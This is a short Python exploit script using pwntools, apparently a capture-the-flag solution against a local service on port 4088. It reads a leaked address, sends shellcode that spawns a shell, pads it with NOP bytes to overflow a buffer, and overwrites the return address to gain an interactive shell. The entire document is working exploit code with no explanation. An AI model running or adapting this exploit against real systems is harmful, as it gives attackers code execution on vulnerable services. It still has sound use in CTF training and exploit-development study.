from pwn import *

io = remote("localhost",4088)
io.recvuntil("journey")
addr = io.recvuntil("!").rstrip(b"!")
addr_shellcode = int(addr,16)
log.info("&shellcode={}".format(hex(addr_shellcode)))

shellcode = asm(shellcraft.sh())

payload = shellcode
payload += b'\x90' * (0x12e-len(shellcode))
payload += p32(addr_shellcode)

io.sendline(payload)
io.interactive()